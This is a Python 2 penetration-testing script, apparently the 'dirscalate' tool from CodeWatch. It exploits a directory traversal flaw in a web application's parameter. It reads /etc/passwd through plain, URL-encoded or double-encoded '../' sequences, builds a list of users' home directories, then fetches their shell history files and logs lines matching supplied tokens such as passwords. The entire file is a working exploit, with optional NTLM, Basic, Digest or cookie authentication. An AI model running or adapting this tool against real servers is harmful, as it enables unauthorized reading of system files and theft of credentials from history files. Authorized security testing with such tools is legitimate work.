# Josh Berry
# CodeWatch
# December 2013
# 

import re
import argparse
import StringIO
import datetime
import requests
from requests.auth import HTTPBasicAuth
from requests.auth import HTTPDigestAuth
from requests_ntlm import HttpNtlmAuth

parser = argparse.ArgumentParser(prog='dirscalate.py', 
	formatter_class=argparse.ArgumentDefaultsHelpFormatter,
	description='Exploit a directory traversal vulnerability to find sensitive information',
	epilog='Example: dirscalate.py --link https://www.victim.com/login.php?test=1&blah=#vulnerability#&id=2 --histfile histfile.txt --tokens tokens.txt --depth 10 --type standard')
parser.add_argument('--link', 
	required=True,
	help='the full URL to exploit, replace value in vulnerable parameter with #vulnerability# marker (must include http(s)://')
parser.add_argument('--histfile', 
	default='histfile.txt',
	help='the list of history files to search')
parser.add_argument('--tokens', 
	default='tokens.txt',
	help='the list of strings to search for in the history files')
parser.add_argument('--logfile', 
	default='dirscalate.txt',
	help='the logfile to write matches to')
parser.add_argument('--depth', 
	default=10,
	type=int,
	help='the length of the traversal attempt')
parser.add_argument('--type', 
	default=1,
	type=int,
	help='1 (../), 2 (URL encoded), or 3 (double encoded)')
parser.add_argument('--ntlmuser', 
	default=None,
	help='use NTLM authentication with this username (format of domain \\ username)')
parser.add_argument('--ntlmpass', 
	default=None,
	help='use NTLM authentication with this password')
parser.add_argument('--basicuser', 
	default=None,
	help='use BASIC authentication with this username')
parser.add_argument('--basicpass', 
	default=None,
	help='use BASIC authentication with this password')
parser.add_argument('--digestuser', 
	default=None,
	help='use DIGEST authentication with this username')
parser.add_argument('--digestpass', 
	default=None,
	help='use DIGEST authentication with this password')
parser.add_argument('--cookie', 
	default=None,
	help='use a previously established sessions cookie')

parser.set_defaults(histfile='histfile.txt', tokens='tokens.txt', logfile='dirscalate.txt', depth=10, type=1)

# Stick arguments in a variable
args = vars(parser.parse_args())
separator = ''
req = ''
session = requests.Session()
cookies = {}

# BUild the depth of the traversal for the link
def buildTraversal(depth, type):
  traversal = ''
  for x in range(0, depth):
    traversal += type
  return traversal

# Add the traversal to the link
def createLink(link, traversal):
  traverseLink = re.sub('#vulnerability#', traversal, link)
  return traverseLink

# Write matches to a log file
def writeLog(alert):
  logfile = open(args['logfile'], 'a')
  logTime = str(datetime.datetime.now())
  logfile.write(logTime+': '+alert+'\n')
  logfile.close()

# Select the traversal type
traverseType = ''
if args['type'] == 3:
  traverseType = '%252e%252e%252f'
  separator = '%252f'
elif args['type'] == 2:
  traverseType = '%2e%2e%2f'
  separator = '%2e%2e%2f'
else:
  traverseType = '../'
  separator = '/'

passwd = 'etc'+separator+'passwd'

# Build the malicious link
traversal = buildTraversal(args['depth'], traverseType)+passwd
newLink = createLink(args['link'], traversal)

# Load the history file
history = open(args['histfile'])

print '[*] Attempting exploit on: '+newLink

# Check to see if BASIC/DIGEST/NTLM/Cookie authentication is being performed
# If so, pass credentials to session, if not, just connect to JNLP URL
if args['ntlmuser'] is not None and args['ntlmpass'] is not None:
  session.auth = HttpNtlmAuth(args['ntlmuser'],args['ntlmpass'], session)
  req = session.get(newLink, verify=False)
elif args['basicuser'] is not None and args['basicpass'] is not None:
  session.auth = HTTPBasicAuth(args['basicuser'],args['basicpass'])
  req = session.get(newLink, verify=False)
elif args['digestuser'] is not None and args['digestpass'] is not None:
  session.auth = HTTPDigestAuth(args['digestuser'],args['digestpass'])
  req = session.get(newLink, verify=False)
elif args['cookie'] is not None:

  # Check to see if the cookie has a semicolon, if so there might be mutiple cookies
  if re.search(';', args['cookie']):
    cookielist = args['cookie'].split(';')

    # Loop through list of cookies
    for dircookies in cookielist:

      # If there isn't an equal and some sort of content, then it isn't a valid cookie, otherwise add to list of cookies
      if re.search('[a-zA-Z0-9]', dircookies) and re.search('[=]', dircookies):
        cookieparts = dircookies.split('=')
        cookies[cookieparts[0]] = cookieparts[1]

  else:

    # Check to see if cookie has =, if not it is malformed and send dummy cookie
    # If so, split at the = into correct name/value pairs
    if re.search('=', args['cookie']):
      cookielist = args['cookie'].split('=')
      cookies[cookielist[0]] = cookielist[1]
    else:
      cookies['dirscalate'] = 'dirscalate'

  req = session.get(newLink, cookies=cookies, verify=False)
else:
  req = session.get(newLink, verify=False)

# If the status code is not 200, the file was likely inaccessible so we exit
if req.status_code is not 200:
  print '[*] Link was inaccessible, exiting.'
  exit(0)

page = req.text
lines = page.split('\n')
homedirs = []

print '[*] Building list of home directories'
for line in lines:
  if re.search('^[a-zA-Z0-9]', line):
    if line not in homedirs:
      home = line.split(':')

      if len(home) >= 6:
        if home[5] is not None:
          if re.search('^/[a-zA-Z0-9]', home[5]):
            homedirs.append(home[5])
            print '[+] Adding home directory: '+home[5]
          else:
            homedirs.append('/')
            print '[+] Adding home directory: /'
        else:
          homedirs.append('/')
          print '[+] Adding home directory: /'
      else:
        homedirs.append('/')
        print '[+] Adding home directory: /'

print '[*] Checking each history file'
# Loop through each history file
for hist in history.readlines():
  # Loop through each enumerated home directory
  for home in homedirs:
    # Build the traversal link
    getfile = re.sub('^\/', '', home)
    getfile = re.sub('/', separator, getfile)
    traversal = buildTraversal(args['depth'], traverseType)+getfile+separator+hist.strip()
    newLink = createLink(args['link'], traversal)
    print '[+] Searching: '+home+separator+hist.strip()

    try:
      # Access the traversal link
      req = ''

      if args['cookie'] is not None:
        req = session.get(newLink, cookies=cookies, verify=False)
      else:
        req = session.get(newLink, verify=False)

      page = req.text
      lines = page.split('\n')
      treasure = []

      # Load the tokens file
      tokens = open(args['tokens'])
  
      # Loop through each token
      for token in tokens.readlines():
        stoken = token.strip()

        # Loop through each line of the history file
        for line in lines:
          sline = line.strip()
          
          # If we found a match, write to a logfile
          if re.search(stoken, sline, re.IGNORECASE):
            if sline not in treasure:
              print '[-] Found a matching token in '+home+separator+hist.strip()
              writeLog(home+separator+hist.strip()+': '+sline)
              treasure.append(sline)
    except:
      print '[-] Failed accessing history file at '+home+separator+hist.strip()